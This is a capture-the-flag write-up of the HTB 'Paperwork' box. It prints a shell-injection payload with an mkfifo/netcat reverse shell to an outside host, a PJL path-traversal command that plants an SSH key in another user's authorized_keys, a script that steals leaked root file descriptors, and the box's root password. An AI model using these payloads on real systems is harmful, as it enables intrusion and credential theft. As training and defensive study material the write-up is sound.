# Machine Information

This box ended up being a really interesting chain: command injection in a custom printer daemon, then a path traversal bug in a fake JetDirect/PJL service to plant an SSH key, and finally a genuinely clever kernel-level trick involving Unix domain sockets and file descriptor passing to steal the root password straight out of memory.

# Enumeration

## Nmap

The initial scan showed three open ports:

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1515/tcp open  ifor-protocol
```

SSH and HTTP are standard, but that third port immediately caught my attention. Port 1515 is registered as `ifor-protocol`, but in practice it's commonly used for LPD (Line Printer Daemon) type services. Combined with the box's name Paperwork that felt like a strong hint that the printing service was going to be the real way in.

## Web Enumeration

While looking through the website on port 80 (paperwork.htb), I found something way more useful than a login form: a downloadable zip file sitting right there on the site. Since the whole box is themed around "Paperwork" and there was already a weird custom service running on port 1515, grabbing that zip felt like the obvious move HTB boxes love hiding source code or config bundles like this behind a normal-looking web page, and it usually explains exactly what a custom service is doing under the hood.

I downloaded it and unzipped it locally, and inside was the full source for the custom LPD server: `server.py`, plus a `.env` file. That was a big deal, because instead of blindly poking at port 1515 over the wire and guessing at the protocol, I now had the entire implementation sitting in front of me to read through.

## Service Enumeration

Here's the LPD manager script, `server.py`, exactly as it came out of the zip:

```python
import socket
import threading
import subprocess
import os

VALID_QUEUE = os.environ.get("LPD_QUEUE")

class LpdHandler(threading.Thread):

    def __init__(self, sock, addr):
        super().__init__()
        self.sock = sock
        self.addr = addr
        self.id = f"[lpd-{addr[1]}]"

    def run(self):
        try:
            data = self.sock.recv(1024)
            if not data: return
            
            command = data[0]
            
            if command == 2:
                self.handle_print_job(data)
            elif command in (3, 4):
                self.sock.send(b"Archive_Printer is ready and printing.\n")
                
        except Exception as e:
            print(f"{self.id} Error: {e}")
        finally:
            self.sock.close()

    def handle_print_job(self, data):
        queue = data[1:].decode().strip()
        
        if queue not in VALID_QUEUE:
            print(f"{self.id} Rejected: Invalid queue '{queue}'")
            self.sock.send(b'\x01') 
            return
        print(f"{self.id} Accepted job for queue: {queue}")
        while True:
            chunk = self.sock.recv(1024)
            if not chunk: break
            
            subcommand = chunk[0]
            self.sock.send(b'\x00') 
            parts = chunk[1:].decode(errors='ignore').split()
            if not parts: continue
                
            size = int(parts[0])
            content = b""
            while len(content) < size:
                content += self.sock.recv(size - len(content) + 1)
                
            decoded_content = content.decode(errors='ignore')
                
            job_name = "Unknown"
            for line in decoded_content.split('\n'):
                line = line.strip()
                if line.startswith('J'):
                    job_name = line[1:]
                    break
                
            print(f"{self.id} Executing archive for: {job_name}")
            subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
                
            self.sock.send(b'\x00') 
            self.sock.send(b'\x00')
            while self.sock.recv(4096):
                pass
            break

class LpdServer:

    def __init__(self, ip='0.0.0.0', port=1515):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((ip, port))
        self.server.listen(100)
        print(f"[*] LPD Server listening on {port}")

    def run(self):
        while True:
            sock, addr = self.server.accept()
            LpdHandler(sock, addr).start()

if __name__ == "__main__":
    LpdServer(port=1515).run()
```

Reading through this told me two important things right away. First, there's a queue check `VALID_QUEUE = os.environ.get("LPD_QUEUE")` and `handle_print_job` immediately rejects with a `\x01` byte if the queue name I send doesn't match. So before I could reach anything interesting, I needed to know the correct queue name. Second, and much more importantly, the actual vulnerability: `job_name` gets parsed out of any line in the job data starting with `J`, and then gets dropped straight into an f-string passed to `subprocess.Popen(..., shell=True)`:

```python
print(f"{self.id} Executing archive for: {job_name}")
subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
```

This is about as textbook as command injection gets. `job_name` is fully attacker-controlled, gets dropped straight into a shell string, and `shell=True` means the whole thing gets interpreted by `/bin/sh` so anything I smuggle into that `J` line gets executed on the system, no sanitization at all.

The `.env` file from the zip answered my first question the valid queue name:

```
LPD_QUEUE=archive_intake
```

Since I now had the exact source and the exact environment variable, I set the same server up locally with that value and ran it myself, so I could work out the right protocol sequence safely before touching the real target:

```bash
export LPD_QUEUE="archive_intake" python3 server.py
```

```bash
echo -ne '\x03' | timeout 2 nc localhost 1515
```

```
Archive_Printer is ready and printing.
```

Now I needed to actually get past the queue check to reach the vulnerable `handle_print_job` code path. I looked up the actual LPD protocol spec (RFC 1179) to get the byte format right: command byte `02` means "Receive a printer job," followed by the queue name and a linefeed ([RFC 1179](https://datatracker-ietf-org.translate.goog/doc/html/rfc1179?_x_tr_sl=en&_x_tr_tl=id&_x_tr_hl=id&_x_tr_pto=tc)). Based on that, I tested the queue handshake locally:

```bash
printf '\x02archive_intake\x0a' | nc localhost 1515
```

Byte `\x02` selects the print-job path, `archive_intake` matches `VALID_QUEUE` from the `.env` file, and `\x0a` (linefeed) closes out the queue name per the RFC. The queue got accepted no `\x01` rejection byte came back which meant I now had the exact request structure needed to reach the injectable `job_name` code.

# Initial Foothold

With the queue name confirmed as `archive_intake` and the request format worked out locally, I could now build a real exploit against the actual target instead of just guessing at the protocol. Since the `job_name` value gets wrapped in single quotes inside the shell command (`'{job_name}'`), the plan was to break out of those quotes and chain in my own command. I used a single-quote breakout combined with `mkfifo` to build a proper reverse shell, since a plain `bash -i >& /dev/tcp/...` one-liner can be unreliable depending on the shell interpreting it using a named pipe (FIFO) makes the interactive shell handling much more robust, especially against `/bin/sh` targets that don't fully support bash's `/dev/tcp` redirection syntax the same way.

The payload, sent through a small Python socket script talking to the LPD service:

```python
PAYLOAD = "J'; rm /tmp/p; mkfifo /tmp/p; cat /tmp/p | /bin/sh -i 2>&1 | nc 10.10.14.36 4444 > /tmp/p; echo '\n"
```

I had a netcat listener running and waiting:

```
nc -lvnp 4444
listening on [any] 4444 ...
connect to from (UNKNOWN) 55214
lp@paperwork:/opt/LPDServer$ id
uid=7(lp) gid=7(lp) groups=7(lp)
```

The injection worked, and I landed a shell as the `lp` user which makes total sense, since `lp` is the standard Linux system account used for printing services, and that's exactly the account this custom LPD daemon was running under.

# Privilege Escalation

## Getting from `lp` to `archivist` JetDirect/PJL path traversal

With a shell as `lp`, I checked what other services were listening locally, since internal-only services are a classic pivot point once you're already inside the box:

```
lp@paperwork:/$ ss -tlnp
```

Port 9100 showed up, bound only to `127.0.0.1`. Port 9100 is the standard raw printing port used by JetDirect/PJL (Printer Job Language) basically another printer protocol, which fit the whole "Paperwork" theme perfectly. Since this wasn't reachable from outside the box, I hadn't seen it in the original nmap scan, but from inside as `lp` it was fair game.

I grabbed the banner using bash's `/dev/tcp` redirection trick (since i couldn't use telnet/error), sending a standard PJL info request:

```bash
exec 3<>/dev/tcp/127.0.0.1/9100; echo -e "@PJL INFO ID\r\n" >&3; cat <&3
```

```
HP LASERJET 4ML
```

So it was emulating an HP LaserJet 4ML over PJL. I went looking for the source behind this emulated printer and found `jetdirect.py`. Reading through it, especially the part handling `@PJL FSUPLOAD`, showed that the service restricts file operations to a specific sandbox directory, `/home/archivist/printer/`. That directory name was the giveaway this printer service runs as (or at least has file access tied to) the user `archivist`, which was my target for the next privilege jump.

The path restriction logic used `os.path.normpath` to "clean up" the path before applying it but that function alone doesn't stop directory traversal, it just normalizes `..` sequences rather than blocking them. That meant if I could get enough `../` segments past the sandbox check, I could walk right out of `/home/archivist/printer/` and write files anywhere `archivist` has permission to write including their own `.ssh` folder.

The plan was simple from there: generate my own SSH keypair, then abuse the traversal bug to plant my public key as `archivist`'s `authorized_keys` file.

First, generate the key pair on my Kali box:

```bash
ssh-keygen -t ed25519 -f /tmp/paperwork_key -N ""
```

Since the PJL upload command needs an exact byte size for the file, I calculated the precise size of the public key with no trailing newline:

```bash
echo -n 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAoOIaknDeLzWxJwShMTjRI/R5tBVD0sPUTptN3HXbg7 wakamiya@wakamiya' | wc -c
# Output: 98
```

Then I built the actual upload payload. I used a `0:/../../../../` prefix to escape the sandbox and land directly in the real `.ssh` directory under `archivist`'s home, and sent the whole thing over a single `/dev/tcp` connection in one go so the binary framing of the PJL protocol wouldn't get corrupted by splitting it across multiple writes:

```bash
K='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAoOIaknDeLzWxJwShMTjRI/R5tBVD0sPUTptN3HXbg7 wakamiya@wakamiya'; exec 3<>/dev/tcp/127.0.0.1/9100; echo -ne "@PJL FSDOWNLOAD FORMAT:BINARY NAME=\"0:/../../../../home/archivist/.ssh/authorized_keys\" SIZE=98\r\n" >&3; echo -n "$K" >&3; echo -ne "\x1b%-12345X\r\n" >&3; exec 3>&-
```

To make sure it actually landed where I wanted, I listed the directory through the same printer protocol (using telnet):

```bash
@PJL FSDIRLIST NAME="/home/archivist/.ssh/" ENTRY=1 COUNT=max_entries
```

```
. TYPE=DIR
.. TYPE=DIR
authorized_keys TYPE=FILE SIZE=98
```

98 bytes, exactly matching my public key no extra characters, no corruption. That confirmed the traversal write worked cleanly. From there, logging in as `archivist` was just a normal SSH connection using my private key:

```bash
ssh -i /tmp/paperwork_key archivist@TargetIP
```

```
archivist@paperwork:~$ whoami
archivist
archivist@paperwork:~$ cat user.txt
REDACTED
```

That got me the user flag and a stable shell as `archivist`.

## Getting from `archivist` to `root` SCM_RIGHTS file descriptor leak

Now for the fun part. Poking around as `archivist`, I found a Unix domain socket that my group had access to:

```bash
archivist@paperwork:~$ ls -la /run/paperwork/mgmt.sock
srw-rw---- 1 root archivist 0 Jul 17 02:27 /run/paperwork/mgmt.sock
```

Owned by `root`, but group `archivist` with read/write meaning I could connect to it. That's usually a sign there's some kind of management or monitoring daemon listening on the other end, so I went looking for the binary behind it, `/usr/bin/paperwork-daemon`, and found the source logic that explained what this socket actually does:

```python
def scan_for_malice():
    with open(LOG_PATH, 'r') as f:
        content = f.read().upper()
        if any(trigger in content for trigger in ["FSQUERY", "FSUPLOAD", "FSDOWNLOAD"]):
            return True

def trigger_lockdown(conn):
    log_fd = os.open(LOG_PATH, os.O_RDONLY)
    evidence_bundle = array.array("i", [log_fd, admin_fd])
    conn.sendmsg([msg], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)])
```

This is where it got genuinely interesting. The daemon watches the printer log file for suspicious PJL keywords (`FSQUERY`, `FSUPLOAD`, `FSDOWNLOAD` basically the same commands I'd just used to pull off the previous step). If it finds one of those words in the log, it assumes something malicious is going on and enters a "lockdown" state. As part of that lockdown response, it grabs a file descriptor for a secret file, `/etc/paperwork/admin_pins.conf` (`admin_fd`), bundles it together with the log file descriptor, and sends both over to whoever's connected to the socket using `SCM_RIGHTS`.

`SCM_RIGHTS` is a real Unix/Linux kernel mechanism that lets a process pass open file descriptors to another process over a Unix domain socket. The receiving process doesn't get the file's contents directly it gets an actual open file descriptor, as if it had opened the file itself, even if it normally wouldn't have permission to open that file on its own. So even though `archivist` has zero read permission on `/etc/paperwork/admin_pins.conf`, if the daemon (running as root) hands over a file descriptor for it, `archivist` can read straight through that descriptor, permission checks completely bypassed, because those checks were already done once when root itself opened the file.

So the whole exploit here was: make the daemon think something malicious happened (to trigger the lockdown / FD leak), and have a listener ready on the socket to catch that leaked file descriptor.

Triggering the lockdown was as simple as writing one of the trigger words into the log file the daemon watches:

```bash
echo "FSUPLOAD" > /home/archivist/printer/logs/commands.log
```

Then I needed something on my end that could actually receive a file descriptor over `SCM_RIGHTS`, which isn't something you can do with a normal netcat connection it needs to be done at the socket API level. I wrote a small Python script, `/tmp/bypass_mgmt.py`, to connect to the management socket and pull the file descriptors out of the ancillary data using `recvmsg`:

```python
import socket, os, array
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/run/paperwork/mgmt.sock")

fds = array.array("i")
msg, ancdata, flags, addr = s.recvmsg(1024, socket.CMSG_LEN(fds.itemsize * 10))

for cmsg_level, cmsg_type, cmsg_data in ancdata:
    if cmsg_level == socket.SOL_SOCKET and cmsg_type == socket.SCM_RIGHTS:
        fds.frombytes(cmsg_data[:len(cmsg_data) - (len(cmsg_data) % fds.itemsize)])

for fd in fds:
    try:
        with os.fdopen(fd, "r") as f:
            print(f.read())
    except: pass
s.close()
```

# Root

I ran the interceptor script:

```bash
archivist@paperwork:/tmp$ python3 bypass_mgmt.py
```

And it worked exactly as planned the daemon's lockdown routine fired because of the `FSUPLOAD` string in the log, it leaked its file descriptors over the socket, and my script grabbed them and read straight through:

```
ADMIN_PASSWORD=ApparelMortuaryCedar22
```

That's the root password, pulled straight out of a file I had no permission to open myself, just by catching a file descriptor the daemon leaked to me over the socket. From there it was just:

```bash
archivist@paperwork:/tmp$ su root
Password: ApparelMortuaryCedar22
root@paperwork:cat /root/root.txt
f9578997fcREDACTEDxxxxxxx
```

Root, done and a genuinely satisfying way to get there.

# Lessons Learned

- **`shell=True` with unsanitized input is still one of the most common ways into a box.** The LPD daemon's `subprocess.Popen(f"...{job_name}...", shell=True)` took a fully attacker-controlled field straight from a network protocol and handed it to a shell with no sanitization at all. The fix here is straightforward: never build shell command strings by hand pass arguments as a list and avoid `shell=True` entirely wherever possible.
- **`os.path.normpath` does not stop path traversal.** It normalizes `..` sequences, but doesn't strip them, so anyone can still walk out of a "restricted" directory with enough `../` prefixes. If you need a real sandbox, you have to validate the final resolved path is still inside the allowed directory not just clean up the string.
- **Internal-only services (bound to `127.0.0.1`) are still attack surface once you have any foothold.** Port 9100 was never visible from outside, but it was exactly what got me from `lp` to `archivist`.
- **Passing file descriptors between processes is powerful, and dangerous if misused.** `SCM_RIGHTS` is a legitimate and useful kernel feature, but here it let a root process accidentally (or carelessly) hand over read access to a secret file to a lower-privileged user, just by tricking the daemon's own "security" logic into thinking it needed to share evidence. Sensitive file descriptors should never be passed to a socket that a non-root group can connect to, no matter what the intended use case is.
- **A "security" feature can become the vulnerability itself.** The whole root escalation only worked *because* the daemon had a built-in lockdown/evidence-gathering feature. Ironically, the alarm system designed to catch malicious printer activity was the exact mechanism that leaked the root password.
